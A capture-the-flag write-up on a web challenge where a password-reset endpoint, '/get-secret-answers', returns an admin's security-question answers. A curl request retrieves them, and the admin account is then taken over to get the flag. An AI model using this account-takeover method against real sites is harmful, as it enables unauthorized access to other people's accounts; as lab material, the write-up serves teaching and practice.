**Author: Zukane**

*The helpdesk is sick and tired of resetting users passwords. To help them out, we've developed a state of the art security questions system that allows users to reset their own passwords.*

##### Challenge overview

In this web challenge, we are not given any source code, but we can connect to a website.
On the site, we can login, register a new user, or recover a forgotten password.

I began by registering a new user. On the register page, we are prompted for a username and password like usual, but also three security questions. I just enter `test` on every field. 
After registering the user, we can log in. We are then met with a dashboard which simply lists the usernames of the admins:
1. klarz
2. iLoop

Since the only notable feature on the page is the `forgot-password` page, I navigate to it. On the page, we are prompted for the username of whoever we want to recover the password from. I input `klarz`, hoping that I can reset the password of an admin user and elevate my priveleges.

To reset a password, we need to answer the three security questions generated on account registration. 

##### Solution

By inspecting the source on the `/forgot-password` page, we can see the JavaScript code is present.

We can see how the site fetches the security questions:

```javascript
const username = document.getElementById('username').value;

fetch('/get-secret-answers', {
	method: 'POST',
	headers: { 'Content-Type': 'application/json' },
	body: JSON.stringify({ username: username })
})
```

It performs a POST-request to `/get-secret-answers` with the username we specified. Using curl, we can make the same POST-request and see what the secret answers are:

```
└─$ curl -X POST https://munintrollet-4202-questions.ept.gg/get-secret-answers \
     -H "Content-Type: application/json" \
     -d '{"username": "klarz"}'     
   
{"secret_answer_1":"kryptolarz","secret_answer_2":"nicw","secret_answer_3":"I dont have one","secret_question_1":"What was your childhood nickname?","secret_question_2":"What is the name of your first pet?","secret_question_3":"What was the make and model of your first car?"}
```

To make it more clear, the answers are:

```
What was your childhood nickname?               - kryptolarz
What is the name of your first pet?             - nicw
What was the make and model of your first car?  - I dont have one
```

By inputting these values on the site, we can reset the admin's password to anything we want.
After resetting the password, we can simply log in. We are then met with a welcome message as well as the flag:

```
# Welcome ADMIN!1
EPT{cl13nt_s1d3_v4l1d4t1on_1s_l0l}
```

